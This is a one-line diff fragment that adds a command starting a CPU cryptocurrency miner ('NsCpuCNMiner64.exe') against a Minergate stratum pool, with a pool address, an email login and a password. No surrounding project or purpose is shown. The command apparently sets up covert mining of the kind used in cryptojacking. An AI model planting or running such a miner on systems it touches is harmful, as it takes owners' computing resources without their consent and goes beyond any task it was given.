@@ -1,0 +1,1 @@
+NsCpuCNMiner64.exe -o stratum+tcp://xmc.pool.minergate.com:45560 -u troffast@protonmail.com -p x
